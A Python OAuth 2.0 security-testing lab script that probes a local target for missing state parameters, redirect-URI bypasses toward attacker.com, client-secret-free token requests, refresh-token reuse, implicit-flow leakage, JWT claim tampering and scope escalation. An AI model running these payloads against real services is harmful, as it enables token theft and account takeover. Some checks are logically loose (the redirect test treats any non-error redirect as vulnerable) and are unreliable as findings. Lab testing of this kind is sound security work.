#!/usr/bin/env python3
"""
Critical Lab: OAuth 2.0 Security Bypass and Token Manipulation
Real-world scenario: Testing for common OAuth vulnerabilities in production APIs

This lab covers:
- OAuth 2.0 token manipulation and forgery
- State parameter vulnerabilities (CSRF)
- Redirect URI validation bypasses
- Implicit flow vulnerabilities
- Token endpoint security
- Refresh token abuse
"""

import requests
import json
import jwt
from urllib.parse import urlencode, parse_qs, urlparse
from typing import Dict, List, Optional
import hashlib
import base64
import time

class OAuth2SecurityLab:
    """
    Critical security testing lab for OAuth 2.0 vulnerabilities
    """
    
    def __init__(self, target_url: str, client_id: str, client_secret: str):
        self.target_url = target_url
        self.client_id = client_id
        self.client_secret = client_secret
        self.session = requests.Session()
        self.vulnerabilities_found = []
    
    def test_missing_state_parameter(self, auth_endpoint: str) -> Dict:
        """
        Test 1: Missing or improper state parameter validation
        Vulnerability: CSRF attacks on OAuth flow
        """
        print("[*] Testing missing state parameter vulnerability...")
        
        auth_url = f"{auth_endpoint}?client_id={self.client_id}&response_type=code&redirect_uri={self.target_url}/callback"
        
        # Try authorization without state parameter
        try:
            response = self.session.get(auth_url, allow_redirects=False)
            if response.status_code in [301, 302, 303]:
                location = response.headers.get('Location', '')
                if 'code=' in location and 'state=' not in location:
                    self.vulnerabilities_found.append("Missing State Parameter - CSRF Vulnerability")
                    return {"vulnerable": True, "severity": "CRITICAL", "url": auth_url}
        except Exception as e:
            print(f"[!] Error testing state parameter: {e}")
        
        return {"vulnerable": False}
    
    def test_redirect_uri_bypass(self, auth_endpoint: str) -> Dict:
        """
        Test 2: Redirect URI validation bypass
        Vulnerability: Authorization code sent to attacker-controlled server
        """
        print("[*] Testing redirect URI validation bypass...")
        
        payloads = [
            f"{self.target_url}/callback@attacker.com",
            f"attacker.com/{self.target_url}/callback",
            f"{self.target_url}/callback?redirect=attacker.com",
            f"{self.target_url}/callback.attacker.com",
            f"{self.target_url}/callback#attacker.com",
        ]
        
        for payload in payloads:
            try:
                url = f"{auth_endpoint}?client_id={self.client_id}&response_type=code&redirect_uri={payload}"
                response = self.session.get(url, allow_redirects=False)
                
                if response.status_code in [301, 302, 303]:
                    location = response.headers.get('Location', '')
                    if 'code=' in location or 'error=' not in location:
                        self.vulnerabilities_found.append(f"Redirect URI Bypass - Payload: {payload}")
                        return {"vulnerable": True, "payload": payload, "severity": "CRITICAL"}
            except:
                pass
        
        return {"vulnerable": False}
    
    def test_token_endpoint_security(self, token_endpoint: str) -> Dict:
        """
        Test 3: Token endpoint security issues
        Vulnerability: Weak client authentication, token generation flaws
        """
        print("[*] Testing token endpoint security...")
        
        # Test 3a: Client authentication bypass
        data = {
            "grant_type": "authorization_code",
            "code": "malicious_code_123",
            "redirect_uri": f"{self.target_url}/callback"
        }
        
        try:
            # Try without client_secret
            response = self.session.post(
                token_endpoint,
                data={**data, "client_id": self.client_id},
                headers={"Content-Type": "application/x-www-form-urlencoded"}
            )
            
            if response.status_code == 200:
                try:
                    tokens = response.json()
                    if "access_token" in tokens:
                        self.vulnerabilities_found.append("Token Endpoint - Missing Client Authentication")
                        return {"vulnerable": True, "severity": "CRITICAL", "issue": "No client_secret required"}
                except:
                    pass
        except Exception as e:
            print(f"[!] Error testing token endpoint: {e}")
        
        return {"vulnerable": False}
    
    def test_refresh_token_abuse(self, token_endpoint: str, refresh_token: str) -> Dict:
        """
        Test 4: Refresh token abuse and unlimited renewal
        Vulnerability: No refresh token rotation, excessive lifetime
        """
        print("[*] Testing refresh token abuse...")
        
        data = {
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "client_id": self.client_id,
            "client_secret": self.client_secret
        }
        
        try:
            # Attempt multiple refresh requests
            for i in range(5):
                response = self.session.post(token_endpoint, data=data)
                if response.status_code == 200:
                    tokens = response.json()
                    if "access_token" in tokens:
                        print(f"[+] Successfully refreshed token {i+1}/5 times")
                        if i == 4:
                            self.vulnerabilities_found.append("Unlimited Refresh Token Usage")
                            return {"vulnerable": True, "severity": "HIGH", "attempts": 5}
        except Exception as e:
            print(f"[!] Error testing refresh tokens: {e}")
        
        return {"vulnerable": False}
    
    def test_implicit_flow_vulnerabilities(self, auth_endpoint: str) -> Dict:
        """
        Test 5: Implicit flow token leakage
        Vulnerability: Tokens in URL fragments, no token refresh
        """
        print("[*] Testing implicit flow vulnerabilities...")
        
        url = f"{auth_endpoint}?client_id={self.client_id}&response_type=token&redirect_uri={self.target_url}/callback&scope=read%20write"
        
        try:
            response = self.session.get(url, allow_redirects=False)
            
            if response.status_code in [301, 302, 303]:
                location = response.headers.get('Location', '')
                
                # Check if token is in URL fragment (vulnerable)
                if '#access_token=' in location:
                    self.vulnerabilities_found.append("Implicit Flow Token Leakage - Token in URL Fragment")
                    return {"vulnerable": True, "severity": "CRITICAL", "location": location}
        except Exception as e:
            print(f"[!] Error testing implicit flow: {e}")
        
        return {"vulnerable": False}
    
    def test_jwt_token_manipulation(self, access_token: str) -> Dict:
        """
        Test 6: JWT token manipulation and signature bypass
        Vulnerability: Weak signing algorithm, no signature validation
        """
        print("[*] Testing JWT token manipulation...")
        
        try:
            # Decode JWT without verification
            parts = access_token.split('.')
            if len(parts) == 3:
                # Decode payload
                payload_encoded = parts[1]
                # Add padding if necessary
                padding = 4 - len(payload_encoded) % 4
                if padding != 4:
                    payload_encoded += '=' * padding
                
                payload = base64.urlsafe_b64decode(payload_encoded)
                claims = json.loads(payload)
                
                # Check for weak claims
                if 'exp' not in claims or 'iat' not in claims:
                    self.vulnerabilities_found.append("JWT - Missing expiration or issued time")
                    return {"vulnerable": True, "severity": "HIGH"}
                
                # Try to modify claims
                claims['admin'] = True
                claims['scope'] = 'admin'
                
                return {"vulnerable": False, "claims": claims}
        except Exception as e:
            print(f"[!] Error manipulating JWT: {e}")
        
        return {"vulnerable": False}
    
    def test_scope_escalation(self, token_endpoint: str) -> Dict:
        """
        Test 7: Scope escalation and privilege elevation
        Vulnerability: No proper scope validation
        """
        print("[*] Testing scope escalation...")
        
        payloads = [
            "admin read write delete",
            "user admin superuser",
            "*",
            "admin ",
        ]
        
        for scope_payload in payloads:
            data = {
                "grant_type": "client_credentials",
                "client_id": self.client_id,
                "client_secret": self.client_secret,
                "scope": scope_payload
            }
            
            try:
                response = self.session.post(token_endpoint, data=data)
                if response.status_code == 200:
                    tokens = response.json()
                    if "access_token" in tokens:
                        self.vulnerabilities_found.append(f"Scope Escalation - Granted: {scope_payload}")
                        return {"vulnerable": True, "severity": "CRITICAL", "scope": scope_payload}
            except:
                pass
        
        return {"vulnerable": False}
    
    def run_all_tests(self) -> None:
        """
        Execute all security tests
        """
        print("\n[+] Starting OAuth 2.0 Critical Security Testing Lab")
        print(f"[+] Target: {self.target_url}")
        print("\n" + "="*60 + "\n")
        
        auth_endpoint = f"{self.target_url}/oauth/authorize"
        token_endpoint = f"{self.target_url}/oauth/token"
        
        # Run all tests
        self.test_missing_state_parameter(auth_endpoint)
        self.test_redirect_uri_bypass(auth_endpoint)
        self.test_token_endpoint_security(token_endpoint)
        self.test_refresh_token_abuse(token_endpoint, "refresh_token_123")
        self.test_implicit_flow_vulnerabilities(auth_endpoint)
        self.test_jwt_token_manipulation("eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.")
        self.test_scope_escalation(token_endpoint)
        
        print("\n" + "="*60)
        print("[+] Testing Complete")
        print(f"[+] Vulnerabilities Found: {len(self.vulnerabilities_found)}")
        print("\n" + "="*60 + "\n")
        
        for idx, vuln in enumerate(self.vulnerabilities_found, 1):
            print(f"[{idx}] {vuln}")


if __name__ == "__main__":
    # Lab Setup
    target = "http://api.vulnerable-app.local:8080"
    client_id = "test_client_id"
    client_secret = "test_client_secret"
    
    lab = OAuth2SecurityLab(target, client_id, client_secret)
    lab.run_all_tests()
